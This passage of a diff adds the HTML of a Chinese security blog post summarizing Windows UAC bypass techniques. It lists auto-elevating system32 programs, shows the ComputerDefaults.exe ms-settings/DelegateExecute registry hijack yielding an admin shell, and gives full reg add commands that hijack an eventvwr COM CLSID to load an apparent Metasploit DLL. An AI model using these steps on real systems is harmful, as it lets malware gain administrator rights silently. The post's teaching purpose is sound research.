class="hljs-regexp">/windows/</span>system32/odbcad32.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/PasswordOnWakeSettingFlyout.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/pwcreator.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/rdpshell.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/recdisc.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/rrinstaller.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/shrpubw.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/slui.exe <br>c:<span class="hljs-regexp">/windows/</span>system32<span class="hljs-regexp">/Sysprep/</span>sysprep.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesAdvanced.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesComputerName.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesDataExecutionPrevention.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesHardware.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesPerformance.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesProtection.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemPropertiesRemote.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemSettingsAdminFlows.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/SystemSettingsRemoveDevice.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/Taskmgr.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/tcmsetup.exe<br>c:<span class="hljs-regexp">/windows/</span>system32/TpmInit.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/WindowsUpdateElevatedInstaller.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/WSReset.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/wusa.exe<br></code></pre></td></tr></table></figure>
+
+<p>然后再去寻找不弹uac框的程序，这里我就从上往下开始尝试，找到的是<code>ComputerDefaults.exe  </code>这个exe</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094919649.png" srcset="/img/loading.gif" lazyload alt="image-20220318094919649"></p>
+<p>运行之后直接就会出现默认应用这个界面</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094948895.png" srcset="/img/loading.gif" lazyload alt="image-20220318094948895"></p>
+<h4 id="uac程序特性探究"><a href="#uac程序特性探究" class="headerlink" title="uac程序特性探究"></a>uac程序特性探究</h4><p>通常以shell/open/command命名的键值对存储的是可执行文件的路径，如果exe程序运行的时候找到该键值对，就会运行该键值对的程序，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。</p>
+<p>这里使用process monitor监听<code>ComputerDefaults.exe</code></p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095032315.png" srcset="/img/loading.gif" lazyload alt="image-20220318095032315"></p>
+<p>发现他会去查询<code>HKCU/Software/Classes/ms-settings/Shell/Open/command</code>里面的值</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095044914.png" srcset="/img/loading.gif" lazyload alt="image-20220318095044914"></p>
+<p>那么我们创建一个<code>HKCU/Software/Classes/ms-settings/Shell/Open/command</code>路径，再对<code>ComputerDefaults.exe</code>进行监听尝试</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095139907.png" srcset="/img/loading.gif" lazyload alt="image-20220318095139907"></p>
+<p>然后发现他还会去查询<code>HKCU/Software/Classes/ms-settings/Shell/Open/command/DelegateExecute</code>，而且Result显示的是NAME NOT FOUND，那么可以认为首先去查询<code>HKCU/Software/Classes/ms-settings/Shell/Open/command</code>路径下的注册表，再去查询<code>HKCU/Software/Classes/ms-settings/Shell/Open/command/DelegateExecute</code>是否存在</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095151212.png" srcset="/img/loading.gif" lazyload alt="image-20220318095151212"></p>
+<p>那么这里我创建一个DelegateExecute的键值对，然后把默认键值对指向我的一个程序进行尝试</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095202623.png" srcset="/img/loading.gif" lazyload alt="image-20220318095202623"></p>
+<p>当我运行<code>c:/windows/system32/ComputerDefaults.exe</code>的时候，发现不再弹出的是默认进程的界面，而是打开了我自己的程序</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095226667.png" srcset="/img/loading.gif" lazyload alt="image-20220318095226667"></p>
+<p>那么这里就可以大胆的猜测一下，首先运行<code>ComputerDefaults.exe</code>这个程序之前，会查询<code>HKCU:/Software/Classes/ms-settings/shell/open/command</code>这个目录是否存在，若存在继续寻找同目录下是否有<code>DelegateExecute</code>这个键值对，若两者都存在则执行<code>HKCU:/Software/Classes/ms-settings/shell/open/command</code>指向的exe路径</p>
+<p>为了验证猜想，这里我将exe路径改为cmd，若猜测成立则可以获得管理员权限的cmd</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095250819.png" srcset="/img/loading.gif" lazyload alt="image-20220318095250819"></p>
+<p><code>whoami /priv</code>查看一下果然成功</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318095301046.png" srcset="/img/loading.gif" lazyload alt="image-20220318095301046"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&amp;mid=2247488251&amp;idx=1&amp;sn=24eb93cd3251e323520027e147bca81e&amp;chksm=ce64a847f91321510f316a4d371443a845965652ed13272b7a2296a0ffb4c1313f7ac79d0bc3&amp;scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&amp;mid=2247488251&amp;idx=1&amp;sn=24eb93cd3251e323520027e147bca81e&amp;chksm=ce64a847f91321510f316a4d371443a845965652ed13272b7a2296a0ffb4c1313f7ac79d0bc3&amp;scene=132#wechat_redirect</a></p>
+<h3 id="COM劫持"><a href="#COM劫持" class="headerlink" title="COM劫持"></a>COM劫持</h3><p>和dll劫持类似，应用程序在运行时也会去加载指定CLSID的COM组件，其加载顺序如下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">HKCU<span class="hljs-regexp">/Software/</span>Classes/CLSID<br>HKCR/CLSID<br>HKLM<span class="hljs-regexp">/SOFTWARE/</span>Microsoft<span class="hljs-regexp">/Windows/</span>CurrentVersion<span class="hljs-regexp">/ShellCompatibility/</span>Objects/<br></code></pre></td></tr></table></figure>
+
+<p>以eventvwr为例</p>
+<p>执行该程序时会去寻找{0A29FF9E-7F9C-4437-8B11-F424491E3931}这个组件，这个组件又需要加载InProcServer32指定的DLL，而这个DLL的路径可由用户定义。</p>
+<p>而eventvwr的这个组件一般在HKCR/CLSID找到，所以可以搜索路径劫持。</p>
+<p>利用以下方法可以劫持（搜索路径劫持）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/InProcServer<span class="hljs-number">32</span> /v <span class="hljs-string">&quot;&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;d:/msf_x64.dll&quot;</span> /f <br><br><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/InProcServer<span class="hljs-number">32</span> /v <span class="hljs-string">&quot;LoadWithoutCOM&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;&quot;</span> /f <br><br><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/InProcServer<span class="hljs-number">32</span> /v <span class="hljs-string">&quot;ThreadingModel&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;Apartment&quot;</span> /f <br><br><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/ShellFolder /v <span class="hljs-string">&quot;HideOnDesktop&quot;</span> /t REG_SZ /d <span class="hljs-string">&quot;&quot;</span> /f <br><br><span class="hljs-attribute">reg</span> add HKEY_CURRENT_USER/Software/Classes/CLSID/&#123;<span class="hljs-number">0</span>A<span class="hljs-number">29</span>FF<span class="hljs-number">9</span>E-<span class="hljs-number">7</span>F<span class="hljs-number">9</span>C-<span class="hljs-number">4437</span>-<span class="hljs-number">8</span>B<span class="hljs-number">11</span>-F<span class="hljs-number">424491</span>E<span class="hljs-number">3931</span>&#125;/ShellFolder /v <span class="hljs-string">&quot;Attributes&quot;</span> /t REG_DWORD /d <span class="hljs-number">0</span>xf<span class="hljs-number">090013</span>d /f<br></code></pre></td></tr></table></figure>
+
+<p>一个开源项目，记录了许多Bypassuac的方法。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME/tree/v3.2.x">https://github.com/hfiref0x/UACME/tree/v3.2.x</a></p>
+<h3 id="通过模拟可信目录绕过-UAC"><a href="#通过模拟可信目录绕过-UAC" class="headerlink" title="通过模拟可信目录绕过 UAC"></a>通过模拟可信目录绕过 UAC</h3><p>参考：<a target="_blank" rel="noopener" href="https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e">https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/209033#h2-4">https://www.anquanke.com/post/id/209033#h2-4</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E7%BB%95%E8%BF%87/">绕过</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/UAC/">UAC</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/26/bypass-AMSI/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">bypass-AMSI</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/13/c-powershell%E5%85%8D%E6%9D%80/">
+                        <span class="hidden-mobile">c+powershell免杀</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
